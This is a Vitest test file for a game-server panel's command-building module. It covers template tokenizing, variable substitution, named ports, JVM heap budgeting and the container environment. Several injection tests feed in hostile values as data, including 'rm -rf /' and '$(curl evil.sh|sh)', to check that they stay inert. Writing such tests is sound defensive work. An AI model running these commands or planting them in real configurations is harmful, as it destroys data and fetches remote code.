import { describe, expect, it } from 'vitest';
import {
  InvocationError,
  MAX_HEAP_RATIO,
  buildEnvironment,
  buildInvocation,
  heapBudgetMib,
  substitute,
  tokenize,
} from './invocation.js';

const CONTEXT = {
  environment: { SERVER_JARFILE: 'server.jar', MINECRAFT_VERSION: '1.21.4' },
  memoryMib: 4096,
  allocations: { default: { ip: '0.0.0.0', port: 25565 }, additional: [] },
};

/** The same server, with a second port the operator has named. */
const WITH_NAMED_PORT = {
  ...CONTEXT,
  allocations: {
    default: { ip: '0.0.0.0', port: 25565 },
    additional: [{ ip: '0.0.0.0', port: 27015, role: 'rcon' }],
  },
};

describe('tokenize', () => {
  it('splits on spaces', () => {
    expect(tokenize('java -Xmx1024M -jar server.jar')).toEqual([
      'java',
      '-Xmx1024M',
      '-jar',
      'server.jar',
    ]);
  });

  it('honours double quotes', () => {
    expect(tokenize('java -Dname="My Server" -jar s.jar')).toEqual([
      'java',
      '-Dname=My Server',
      '-jar',
      's.jar',
    ]);
  });

  it('honours single quotes', () => {
    expect(tokenize("java -Dmsg='a b c'")).toEqual(['java', '-Dmsg=a b c']);
  });

  it('ignores repeated spaces and tabs', () => {
    expect(tokenize('java   -jar\t\ts.jar')).toEqual(['java', '-jar', 's.jar']);
  });

  it('keeps an explicitly empty argument', () => {
    expect(tokenize('java -Dx=""')).toEqual(['java', '-Dx=']);
  });

  it('rejects an unclosed quote', () => {
    expect(() => tokenize('java -Dname="oops')).toThrow(InvocationError);
  });

  it('returns an empty array for an empty string', () => {
    expect(tokenize('   ')).toEqual([]);
  });
});

describe('substitute', () => {
  it('replaces known variables', () => {
    expect(substitute('-jar {{SERVER_JARFILE}}', CONTEXT).value).toBe('-jar server.jar');
  });

  it('tolerates spaces inside the braces', () => {
    expect(substitute('{{ SERVER_PORT }}', CONTEXT).value).toBe('25565');
  });

  it('provides the built-in variables', () => {
    // A 4096 MiB container → a 3276 MiB heap (80%), the rest left to the JVM's
    // off-heap and to the page cache.
    expect(substitute('-Xmx{{SERVER_MEMORY}}M', CONTEXT).value).toBe('-Xmx3276M');
    expect(substitute('{{SERVER_IP}}:{{SERVER_PORT}}', CONTEXT).value).toBe('0.0.0.0:25565');
  });

  it('also exposes the raw container limit', () => {
    expect(substitute('{{SERVER_MEMORY_LIMIT}}', CONTEXT).value).toBe('4096');
  });

  it('accepts the dotted notation of Pterodactyl eggs', () => {
    expect(substitute('{{server.build.default.port}}', CONTEXT).value).toBe('25565');
  });

  it('reports an unknown variable and replaces it with nothing', () => {
    const result = substitute('{{UNKNOWN}}-suffix', CONTEXT);
    expect(result.value).toBe('-suffix');
    expect(result.missing).toEqual(['UNKNOWN']);
  });

  // `{{constructor}}` matches the variable pattern, and a plain lookup answers
  // it out of Object.prototype: the argument would come out holding `function
  // Object() { [native code] }` and nothing would call it missing.
  it('does not answer a variable out of the prototype chain', () => {
    const result = substitute('{{constructor}}/{{toString}}', CONTEXT);

    expect(result.value).toBe('/');
    expect(result.missing).toEqual(['constructor', 'toString']);
  });

  // A template must not be able to redirect the listening port announced to
  // players by redefining the variable.
  it('does not let the template overwrite a built-in variable', () => {
    const context = { ...CONTEXT, environment: { SERVER_PORT: '1337' } };
    expect(substitute('{{SERVER_PORT}}', context).value).toBe('25565');
  });
});

/**
 * Reaching a port by the name the operator gave it.
 *
 * The primary port has always been `{{SERVER_PORT}}`. These are for the others
 * — an RCON port, a query port — which until now a command had no way to name
 * at all, since an allocation was an `{ip, port}` with nothing to match on.
 */
describe('the named ports', () => {
  it('resolves a role to its port and its address', () => {
    expect(substitute('{{server.allocations.rcon.port}}', WITH_NAMED_PORT).value).toBe('27015');
    expect(substitute('{{server.allocations.rcon.ip}}', WITH_NAMED_PORT).value).toBe('0.0.0.0');
  });

  it('leaves the primary port to SERVER_PORT alone', () => {
    // The primary carries no role — the contract gives it no field to hold one
    // — so `default` here is not an alias for it. A server that has no port
    // named `default` has no such variable, which is what makes the refusal
    // below possible rather than a wrong answer.
    expect(substitute('{{server.allocations.default.port}}', WITH_NAMED_PORT).missing).toEqual([
      'server.allocations.default.port',
    ]);
    expect(substitute('{{SERVER_PORT}}', WITH_NAMED_PORT).value).toBe('25565');
  });

  it('defines nothing for a port the operator has not named', () => {
    // An unnamed additional allocation is the ordinary case, and it is
    // unreachable by name on purpose: nothing was named, so nothing answers.
    const context = {
      ...CONTEXT,
      allocations: {
        default: { ip: '0.0.0.0', port: 25565 },
        additional: [{ ip: '0.0.0.0', port: 8123 }],
      },
    };

    expect(substitute('{{server.allocations.dynmap.port}}', context).missing).toEqual([
      'server.allocations.dynmap.port',
    ]);
  });

  it('refuses a name it does not have rather than answer with another port', () => {
    // The role exists on some other server, not on this one. Reading it as the
    // primary port is the failure the whole design refuses: the command would
    // speak RCON to the game port, and nobody would be told.
    expect(() =>
      buildInvocation('./factorio --rcon-port {{server.allocations.rcon.port}}', CONTEXT),
    ).toThrow(/no port on this server is named "rcon"|has none/);
  });

  it('says which name went unmatched, and where to create it', () => {
    const message = refusalFor('./factorio --rcon-port {{server.allocations.rcon.port}}', CONTEXT);

    expect(message).toContain('"rcon"');
    // The same two ways out the readiness refusal offers, in the same words:
    // name the port, or stop asking for it.
    expect(message).toContain('Network tab');
  });

  it('builds the command the template wrote once the port is named', () => {
    const { argv } = buildInvocation(
      './factorio --port {{SERVER_PORT}} --rcon-port {{server.allocations.rcon.port}}',
      WITH_NAMED_PORT,
    );

    expect(argv).toEqual(['./factorio', '--port', '25565', '--rcon-port', '27015']);
  });

  it('answers one port for a name a payload carries twice', () => {
    // The panel's unique index makes this impossible and the contract cannot
    // say so. If it ever arrives, the command and the readiness probe have to
    // agree, and `allocationForRole` takes the first.
    const context = {
      ...CONTEXT,
      allocations: {
        default: { ip: '0.0.0.0', port: 25565 },
        additional: [
          { ip: '0.0.0.0', port: 27015, role: 'rcon' },
          { ip: '0.0.0.0', port: 27016, role: 'rcon' },
        ],
      },
    };

    expect(substitute('{{server.allocations.rcon.port}}', context).value).toBe('27015');
  });

  // Dotted names are not POSIX and never reach the container's environment —
  // see `buildEnvironment`. The command is the only place they resolve.
  it('stays out of the environment of the container', () => {
    expect(buildEnvironment(WITH_NAMED_PORT).some((entry) => entry.startsWith('server.'))).toBe(
      false,
    );
  });
});

/**
 * This block exists because of a server killed by the kernel on the test
 * machine, then fixed twice — both mistakes are worth remembering.
 *
 * First, the JVM was launched with `-Xmx` equal to the container limit: the
 * heap alone could fill the cgroup.
 *
 * Then, the 256 MiB headroom covered the JVM's off-heap but forgot the page
 * cache, which counts towards the cgroup too. With measurements: a 1024 MiB
 * container, `-Xmx768M`, anonymous memory climbing to 1018 MiB, cache crushed
 * from 127 MiB to 0, then code 137 — after a start that had fully completed.
 */
describe('heapBudgetMib', () => {
  // Two rules combine, and the stricter wins: a fixed 384 MiB headroom, and an
  // 80% ceiling. The switch happens at 1920 MiB.
  it.each([
    [512, 128],
    [1024, 640],
    [1536, 1152],
  ])('subtracts the fixed headroom on %s MiB', (limit, expected) => {
    expect(heapBudgetMib(limit)).toBe(expected);
  });

  it.each([
    [2048, 1638],
    [4096, 3276],
    [8192, 6553],
  ])('applies the 80%% ceiling on %s MiB', (limit, expected) => {
    expect(heapBudgetMib(limit)).toBe(expected);
  });

  // This is the property that matters, more than the exact values: the heap
  // must never be able to fill the container on its own.
  it.each([256, 512, 1024, 2048, 4096, 8192, 16384, 65536])(
    'leaves at least 20%% of headroom on %s MiB',
    (limit) => {
      const heap = heapBudgetMib(limit);
      expect(heap).toBeLessThanOrEqual(Math.floor(limit * MAX_HEAP_RATIO));
    },
  );

  // The measurement that motivated the fix: at 1024 MiB, the anonymous off-heap
  // alone weighs ~250 MiB. Enough has to be left to cache the region files,
  // failing which the kernel evicts everything then kills the process.
  it('leaves room for the page cache on a small allocation', () => {
    const NON_HEAP_ANON_MIB = 250;
    const heap = heapBudgetMib(1024);

    expect(1024 - heap - NON_HEAP_ANON_MIB).toBeGreaterThanOrEqual(128);
  });

  it('never goes below the JVM startup floor', () => {
    expect(heapBudgetMib(128)).toBe(128);
    expect(heapBudgetMib(64)).toBe(128);
  });

  // With no container limit there is nothing to share out: it is up to the
  // template not to use `-Xmx` in that case.
  it('returns 0 for unlimited memory', () => {
    expect(heapBudgetMib(0)).toBe(0);
  });
});

describe('buildInvocation', () => {
  it('produces a usable argv', () => {
    const { argv } = buildInvocation(
      'java -Xms128M -Xmx{{SERVER_MEMORY}}M -jar {{SERVER_JARFILE}}',
      CONTEXT,
    );

    expect(argv).toEqual(['java', '-Xms128M', '-Xmx3276M', '-jar', 'server.jar']);
  });

  // ---------------------------------------------------------------------------
  // These cases are the reason the module exists: they fail if the split /
  // substitute order is ever reversed.
  // ---------------------------------------------------------------------------

  it('stops a variable value from introducing an argument', () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: 'a.jar --hostile-flag' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv).toEqual(['java', '-jar', 'a.jar --hostile-flag']);
    expect(argv).toHaveLength(3);
  });

  it('stops command injection through a semicolon', () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: 's.jar; rm -rf /' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv).toEqual(['java', '-jar', 's.jar; rm -rf /']);
  });

  it('stops injection through command substitution', () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: '$(curl evil.sh|sh)' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv[2]).toBe('$(curl evil.sh|sh)');
    expect(argv).toHaveLength(3);
  });

  it('stops injection through a newline', () => {
    const context = { ...CONTEXT, environment: { SERVER_JARFILE: 's.jar\nrm -rf /' } };
    const { argv } = buildInvocation('java -jar {{SERVER_JARFILE}}', context);

    expect(argv).toHaveLength(3);
    expect(argv[2]).toBe('s.jar\nrm -rf /');
  });

  it('stops a value from closing a quote of the template', () => {
    const context = { ...CONTEXT, environment: { NAME: 'x" --hostile "y' } };
    const { argv } = buildInvocation('java -Dname="{{NAME}}"', context);

    expect(argv).toEqual(['java', '-Dname=x" --hostile "y']);
  });

  // ---------------------------------------------------------------------------

  // ---------------------------------------------------------------------------
  // An argument that resolves to nothing. Two accidents wearing one face, and
  // the tests below are the record of which is which.
  // ---------------------------------------------------------------------------

  it('drops an argument whose variables are set and empty', () => {
    // `{{JAVA_FLAGS}}` holding nothing is how half the imported eggs say "no
    // extra flags". Passing `java` an empty argument fails the start, so the
    // argument goes — exactly as it always has, because these servers run
    // today and this change is not allowed to stop them.
    const context = { ...CONTEXT, environment: { JAVA_FLAGS: '', SERVER_JARFILE: 's.jar' } };
    const { argv } = buildInvocation('java {{JAVA_FLAGS}} -jar {{SERVER_JARFILE}}', context);

    expect(argv).toEqual(['java', '-jar', 's.jar']);
  });

  it('reports the argument it dropped instead of dropping it quietly', () => {
    const context = { ...CONTEXT, environment: { JAVA_FLAGS: '' } };
    const { droppedArguments } = buildInvocation('java {{JAVA_FLAGS}} -jar s.jar', context);

    // The caller writes this on the server's console. Nothing else would ever
    // tell an operator that the argv is one argument shorter than the command
    // they are reading in the panel.
    expect(droppedArguments).toEqual(['{{JAVA_FLAGS}}']);
  });

  it('refuses to build a command that names a variable nobody defined', () => {
    // This used to produce `['java', '-jar', 's.jar']` and a
    // `missingVariables` list the only caller threw away.
    expect(() =>
      buildInvocation('java {{MISSING}} -jar s.jar', { ...CONTEXT, environment: {} }),
    ).toThrow(InvocationError);
  });

  /**
   * The reason the refusal above is worth a broken start.
   *
   * Dropping the value of a flag does not give a command one argument short:
   * it gives a command where the flag eats the next argument. Here `--rcon-port`
   * would take `--port` as its value, the game would be given no port at all,
   * and the only symptom is the game's own complaint, several lines into a
   * console nobody has open.
   */
  it('never leaves a flag holding the argument that followed its value', () => {
    const template = './factorio --rcon-port {{RCON_PORT}} --port {{SERVER_PORT}}';

    expect(() => buildInvocation(template, { ...CONTEXT, environment: {} })).toThrow(/RCON_PORT/);
  });

  it('rejects an empty template', () => {
    expect(() => buildInvocation('   ', CONTEXT)).toThrow(/empty/);
  });

  it('rejects a template whose executable disappears after substitution', () => {
    // A *defined* variable holding nothing, so the drop rule applies and the
    // argv comes out empty — the unknown-variable refusal would otherwise be
    // the one that fires, and this guard would stop testing anything.
    expect(() =>
      buildInvocation('{{JAVA_HOME}}', { ...CONTEXT, environment: { JAVA_HOME: '' } }),
    ).toThrow(/no executable/);
  });

  it('names every unknown variable, once each, in one refusal', () => {
    // One start, one list: an operator fixing a template should not have to
    // press start once per typo to discover the next one.
    const message = refusalFor('java {{X}} {{X}} {{Y}} -jar s.jar', {
      ...CONTEXT,
      environment: {},
    });

    expect(message).toContain('{{X}}');
    expect(message).toContain('{{Y}}');
    expect(message.match(/\{\{X\}\}/g)).toHaveLength(1);
  });
});

/**
 * The message a refused command comes back with.
 *
 * Returns the empty string when the command builds, so a test that expected a
 * refusal fails on what it was asserting rather than on a thrown assertion
 * caught by its own `catch`.
 */
function refusalFor(template: string, context: Parameters<typeof buildInvocation>[1]): string {
  try {
    buildInvocation(template, context);
    return '';
  } catch (error: unknown) {
    return error instanceof Error ? error.message : String(error);
  }
}

describe('buildEnvironment', () => {
  it('exposes the template variables and the built-in ones', () => {
    const env = buildEnvironment(CONTEXT);

    expect(env).toContain('SERVER_JARFILE=server.jar');
    expect(env).toContain('MINECRAFT_VERSION=1.21.4');
    expect(env).toContain('SERVER_MEMORY=3276');
    expect(env).toContain('SERVER_PORT=25565');
  });

  it('drops names that are invalid in POSIX', () => {
    const env = buildEnvironment(CONTEXT);
    expect(env.some((entry) => entry.startsWith('server.build'))).toBe(false);
  });

  it('does not let the template redefine a built-in variable', () => {
    const env = buildEnvironment({ ...CONTEXT, environment: { SERVER_PORT: '1337' } });

    expect(env).toContain('SERVER_PORT=25565');
    expect(env).not.toContain('SERVER_PORT=1337');
  });
});
